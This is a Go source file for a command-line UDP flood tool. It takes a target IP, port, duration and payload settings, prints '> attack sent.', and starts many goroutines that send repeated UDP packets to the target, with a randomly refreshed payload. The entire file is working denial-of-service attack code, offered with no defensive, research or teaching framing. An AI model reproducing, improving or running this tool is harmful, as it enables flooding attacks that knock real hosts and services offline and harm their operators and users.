package main

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"
)

var alphabet []string = []string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"}
var ddos bool = true
var payload string = ""

func main() {
	var size int
	var target string
	var port string

	var err error

	if len(os.Args) != 6 {
		fmt.Println("Incorrect use")
		fmt.Println("Example: ./UDP-RAW <ip> <port> <time> payload=random (or ur payload) size=1024")
		os.Exit(0)
	}

	target = os.Args[1]
	port = os.Args[2]
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("incorrect size")
		os.Exit(0)
	}

	for _, argv := range os.Args[4:6] {
		if len(strings.Split(argv, "=")) != 2 {
			fmt.Println("incorrect flags.")
			os.Exit(0)
		}

		if strings.Split(argv, "=")[0] == "size" {
			fmt.Println("SIZE")
			size, err = strconv.Atoi(strings.Split(argv, "=")[1])
			if err != nil {
				fmt.Println("incorrect size")
				os.Exit(0)
			}
			fmt.Println(size)
			payload = "random"
			break
		} else if strings.Split(argv, "=")[0] == "payload" {
			payload = strings.Split(argv, "=")[1]
			if strings.ToUpper(payload) == "RANDOM" {
				payload = "random"
			}
		} else {
			fmt.Println("Important flags not found (size, paylaod)")
			os.Exit(0)
		}
	}

	//fmt.Println(size, payload, target, port, duration)
	fmt.Println("> attack sent.")

	if payload == "random" {
		go payloadChanger(size)
	}

	for i := 0; i < runtime.NumCPU()*2; i++ {
		go flood(target, port)
	}
	timer(duration)
}

func flood(target, port string) {
flood:
	conn, err := net.Dial("udp", target+":"+port)
	if err != nil {
		fmt.Println(err.Error())
		goto flood
	}

	defer conn.Close()
	for i := 0; i < 20000; i++ {
		_, err := conn.Write([]byte(payload))
		if err != nil {
			goto flood
		}
		_, err = conn.Write([]byte(payload))
		if err != nil {
			goto flood
		}
		_, err = conn.Write([]byte(payload))
		if err != nil {
			goto flood
		}
		_, err = conn.Write([]byte(payload))
		if err != nil {
			goto flood
		}
		_, err = conn.Write([]byte(payload))
		if err != nil {
			goto flood
		}
		_, err = conn.Write([]byte(payload))
		if err != nil {
			goto flood
		}
		_, err = conn.Write([]byte(payload))
		if err != nil {
			goto flood
		}
		_, err = conn.Write([]byte(payload))
		if err != nil {
			goto flood
		}
		_, err = conn.Write([]byte(payload))
		if err != nil {
			goto flood
		}
		_, err = conn.Write([]byte(payload))
		if err != nil {
			goto flood
		}
	}
}

func payloadChanger(size int) {
	for {
		payload = randStr(size)
		time.Sleep(1000 * time.Microsecond)
	}
}

func timer(duration int) {
	time.Sleep(time.Duration(duration) * time.Second)
	os.Exit(0)
}

func randInt(min, max int) int {
	nBig, err := rand.Int(rand.Reader, big.NewInt(int64(max-min)))
	if err != nil {
		return -1
	}

	return int(nBig.Int64()) + min
}

func randStr(length int) string {
	var str string
	for i := 0; i < length; i++ {
		str += alphabet[randInt(0, len(alphabet))]
	}

	return str
}
